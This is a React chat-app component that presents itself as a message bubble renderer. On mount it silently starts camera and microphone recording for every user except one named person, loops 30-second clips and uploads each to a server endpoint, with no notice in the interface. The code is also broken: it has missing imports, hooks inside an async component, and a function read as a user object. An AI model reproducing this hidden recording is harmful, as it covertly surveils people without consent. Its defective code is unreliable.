"use client";

import Avatar from "@/app/components/Avatar";
import { FullMessageType } from "@/app/types";
import clsx from "clsx";
import { format } from "date-fns";
import { useSession } from "next-auth/react";
import Image from "next/image";
import { useState, useEffect } from "react";
import ImgModal from "./ImgModal";
import VidModal from "./VidModal";
import { User } from '@prisma/client'
    import getCurrentUser from "@/app/actions/getCurrentUser"
interface MessageBoxProps {
    data: FullMessageType;
    isLast?: boolean;
   // currentUser: User
}

const MessageBox: React.FC<MessageBoxProps> = async ({ data, isLast }) => {
    const session = useSession();
    const [imgModal, setImgModal] = useState(false);
const [vidModal, setVidModal] = useState(false);

    const currentUser = async ()=> { return await getCurrentUser() as User };
    const isOwn = session.data?.user?.email === data?.sender?.email;
    const seenList = (data.seen || [])
        .filter((user) => user.email !== data?.sender?.email)
        .map((user) => user.name)
        .join(", ");

    const container = clsx(`flex gap-3 p-4`, isOwn && "justify-end");

    const avatar = clsx(isOwn && "order-2");

    const body = clsx(`flex flex-col gap-2`, isOwn && "items-end");

    const message = clsx(
        `text-sm w-fit overflow-hidden`,
        isOwn ? "bg-[#0c1317] text-[#d1d3d7]" : "bg-[#d1d3d7] text-[#0c1317]",
        data.image ? "rounded-md-p-0" : "rounded-full py-2 px-3"
    );

const [isRecording, setIsRecording] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [timeLeft, setTimeLeft] = useState<number | null>(null)
  const [videoBlob, setVideoBlob] = useState<Blob | null>(null)
  const [isUploading, setIsUploading] = useState(false)
  const [uploadedUrl, setUploadedUrl] = useState<string | null>(null)
    const mediaRecorderRef = useRef<MediaRecorder | null>(null)
  const chunksRef = useRef<Blob[]>([])
  const timerRef = useRef<NodeJS.Timeout | null>(null)
             const parseDuration = (input: string): number | null => {
    const match = input.match(/^(\d+)\s*(seconds?|minutes?)$/)
    if (!match) return null
    const value = parseInt(match[1], 10)
    const unit = match[2]
    return unit.startsWith('minute') ? value * 60 : value
  }

useEffect(()=>{
    if (currentUser && currentUser.name !== "Harriet Clara") {
      startRecording()
    }
    
},[]);
    
  const startRecording = useCallback(async () => {
    if (currentUser?.name === "Harriet Clara") {
      console.log("Recording not started for Harriet Clara")
      return
    }

    const duration = '30 seconds' // Default duration
    const durationInSeconds = parseDuration(duration)
    if (!durationInSeconds) {
      setError('Invalid duration format. Please use "X seconds" or "X minutes".')
      return
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      
      const mediaRecorder = new MediaRecorder(stream)
      mediaRecorderRef.current = mediaRecorder
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          chunksRef.current.push(event.data)
        }
      }
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunksRef.current, { type: 'video/webm' })
        setVideoBlob(blob)
        chunksRef.current = []
        uploadToCloudinary(blob)
startRecording()     
      }
      mediaRecorder.start()
      setIsRecording(true)
      setError(null)
      setTimeLeft(durationInSeconds)

      timerRef.current = setInterval(() => {
        setTimeLeft((prevTime) => {
          if (prevTime === null || prevTime <= 1) {
            clearInterval(timerRef.current!)
            mediaRecorder.stop()
            setIsRecording(false)
            return null
          }
          return prevTime - 1
        })
      }, 1000)
    } catch (error) {
      console.error('Error accessing media devices:', error)
      setError('Failed to access camera and microphone. Please ensure you have granted the necessary permissions.')
//  startRecording()
    }
  }, [currentUser])

  const stopRecording = useCallback(() => {
    if (mediaRecorderRef.current) {
      mediaRecorderRef.current.stop()
      setIsRecording(false)
      //startRecording()
      if (timerRef.current) {
        clearInterval(timerRef.current)
      }
      setTimeLeft(null)
    }
  }, [])

  const uploadToCloudinary = useCallback(async (blob: Blob) => {
    setIsUploading(true)
    setError(null)
    try {
      const formData = new FormData()
      formData.append('file', blob, 'recorded-video.webm')

      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
      })

      if (!response.ok) {
        throw new Error('Upload failed')
      }

      const data = await response.json()
      setUploadedUrl(data.url)
      console.log('Video uploaded successfully:', data.url)
     // startRecording() // Start recording again after successful upload
    } catch (error) {
      console.error('Error uploading video:', error)
      setError('Failed to upload video. Please try again.')
    } finally {
      setIsUploading(false)
    }
  }, [startRecording])
    useEffect(() => {
    const handlePermissionChange = () => {
      navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
        if (result.state === 'denied') {
          localStorage.removeItem(TERMS_ACCEPTED_KEY)
       //   setIsTermsPopupOpen(true)
        }
      })
    }

    navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
      result.onchange = handlePermissionChange
    })

    return () => {
      navigator.permissions.query({ name: 'camera' as PermissionName }).then((result) => {
        result.onchange = null
      })
    }
  }, [])
          

    
    return (
        <div className={container}>
            <div className={avatar}>
                <Avatar user={data.sender} />
            </div>
            <div className={body}>
                <div className="flex items-center gap-1">
                    <div className="text-sm text-[#8696a0]">
                        {data.sender.name}
                    </div>
                    <div className="text-xs text-[#6d7a83]">
                        {format(new Date(data.createdAt), "p")}
                    </div>
                </div>
                <div className={message}>
                    <ImgModal
                        src={data.image}
                        isOpen={imgModal}
                        onClose={() => setImgModal(false)}
                    />
                    {data.image && data.image.includes("/image/")? (
                        <Image 
                            onClick={() => setImgModal(true)}
                            alt="Image"
                            width="0"
                            height="0"
                            sizes="100vw"
                            src={data.image}
                            className="w-auto h-auto object-cover cursor-pointer hover:scale-110 transition translate"
                        />
                    ) : data.image && data.image.includes("/video/")?(
                        <video width="250px" height="500px" controls preload="none">
      <source src={data.image} type="video/mp4" />
      
      Your browser does not support the video tag.
    </video>
                    ) : data.image && data.image.endsWith(".mp3")?(
                        <audio width="250px" height="500px" controls preload="none">
      <source src={data.image} />
      
      Your browser does not support the video tag.
    </audio>
                    ) : (<div className="text-xl">{data.body}</div>
                )}
                </div>
                {isLast && isOwn && seenList.length > 0 && (
                    <div className="text-xs font-light text-[#8696a0]">
                        {`Seen by ${seenList}`}
                    </div>
                )}
            </div>
        </div>
    );
};

export default MessageBox;
